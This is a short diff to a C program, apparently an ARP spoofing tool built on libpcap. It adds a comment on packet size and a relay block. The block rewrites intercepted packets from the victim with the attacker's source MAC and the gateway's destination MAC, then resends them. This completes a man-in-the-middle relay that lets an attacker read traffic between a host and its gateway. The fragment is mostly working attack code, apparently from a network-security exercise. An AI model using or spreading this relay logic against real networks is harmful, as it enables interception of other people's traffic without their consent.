@@ -189,7 +189,7 @@ int main(int argc, char* argv[]) {
     arp = (struct sniff_arp*)(packet + 14);
     ip = (struct sniff_ip*)(packet + 14);
 
-    int packet_size = swap_word_endian(ip->ip_len) + 14;
+    int packet_size = swap_word_endian(ip->ip_len) + 14;     // ip_len + ethernet header size (14)
 
     /* Get sender MAC address and send arp reply packet */
     if(arp_check(swap_word_endian(ethernet->ether_type))    // Is it ARP protocol?
@@ -217,7 +217,10 @@ int main(int argc, char* argv[]) {
         &&!memcmp((char*)ethernet->ether_shost , mac_sender , 6)
         &&ip_check(swap_word_endian(ethernet->ether_type)) )
     {
-      printf("packet size %d \n",packet_size);
+      memcpy(ethernet->ether_shost,mac_attacker,6);               // Change shost to attacker MAC (If you use sender MAC , it doesn't work)
+      memcpy(ethernet->ether_dhost,mac_target,6);                 // Change dhost to target(gateway) MAC
+      printf("doing relay\n");
+      if(pcap_sendpacket(handle , packet , packet_size)!=0) printf("Error with relay (sender)");
     }
 
     /* Send arp reply again */
